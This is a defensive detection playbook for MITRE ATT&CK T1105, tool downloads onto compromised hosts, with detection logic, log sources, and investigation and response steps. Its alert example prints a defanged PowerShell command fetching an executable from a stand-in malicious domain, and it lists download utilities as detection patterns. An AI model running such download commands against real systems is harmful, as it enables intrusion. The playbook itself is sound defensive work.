# Detection Playbook: Ingress Tool Transfer  
**MITRE ATT&CK Technique:** T1105 – Ingress Tool Transfer

---

## 1. Technique Overview

Ingress Tool Transfer occurs when an attacker **downloads tools, scripts, or malware** from an external system onto a compromised host.  
This enables the attacker to expand capabilities such as persistence, lateral movement, data exfiltration, or command execution.

Common transfer methods:
- PowerShell (`Invoke-WebRequest`, `curl`, `wget`)
- Command-line tools (`certutil`, `bitsadmin`)
- Browser-based downloads
- File transfer over SMB, FTP, SCP
- C2-delivered payloads

This technique typically follows **initial access** or **valid account abuse**.

---

## 2. Why This Matters

Ingress Tool Transfer is a **transition point from access to action**.

Attacker goals:
- Deploy additional malware or tooling
- Maintain persistence
- Enable privilege escalation or lateral movement
- Avoid detection by downloading tools only when needed

A compromised host downloading tools from the internet is a high-risk signal.

---

## 3. Log Sources

Logs useful for detecting Ingress Tool Transfer:
- Proxy / web gateway logs
- DNS logs
- Firewall egress logs
- EDR process and file creation telemetry
- Windows Security Logs (4688)
- PowerShell Operational logs
- SIEM platforms (Splunk, Elastic)

---

## 4. Detection Logic

### Behavioral Indicators
- Command-line tools used to download files
- Outbound connections to suspicious or newly registered domains
- File creation shortly after network download
- Executables written to user or temp directories
- Encoded or obfuscated download commands

### Example Pseudo-Logic
IF Process IN (powershell.exe, cmd.exe, certutil.exe, bitsadmin.exe)
AND CommandLine CONTAINS ("http", "https")
AND File_Created = Executable
THEN Alert

yaml
Copy code

### Key Fields Used
- Process Name
- Command Line
- Parent Process
- Destination URL / IP
- File Name and Path
- File Hash
- Timestamp

---

## 5. Alert Example

**Alert Name:** Suspicious Tool Download Detected  
**Severity:** High  

**Description:**  
A system downloaded an executable using a command-line utility, consistent with ingress tool transfer activity.

**Key Details:**
- Host: WKSTN-23
- Process: powershell.exe
- Command: Invoke-WebRequest hxxp://malicious-site[.]com/tool.exe
- File Written: C:\Users\Public\tool.exe
- Time: 01:18 AM

---

## 6. Investigation Steps

1. Identify the downloaded file and compute hashes
2. Check file reputation using threat intelligence
3. Review command-line execution context
4. Determine whether the download was user-initiated or scripted
5. Look for execution of the downloaded file
6. Check for persistence mechanisms
7. Review outbound connections to related domains

---

## 7. Correlation Opportunities

Stronger confidence when correlated with:
- Initial access alerts
- Valid account abuse
- C2 communication
- Process injection or execution
- Persistence techniques

---

## 8. False Positives

Legitimate activity that may trigger alerts:
- IT administrators downloading tools
- Software updates
- Scripted installers
- Development or automation workflows

Allowlisting trusted domains and admin activity is essential.

---

## 9. Response Actions

- Quarantine the downloaded file
- Isolate the affected host if malicious
- Block the domain or IP
- Reset credentials if compromise is suspected
- Perform a full endpoint scan
- Document indicators and lessons learned

---

## 10. Mapping to MITRE ATT&CK

- **T1105 – Ingress Tool Transfer**
  - Often follows:
    - T1078 – Valid Accounts
    - T1566 – Phishing
  - Commonly paired with:
    - T1059 – Command and Scripting Interpreter
    - T1027 – Obfuscated Files or Information
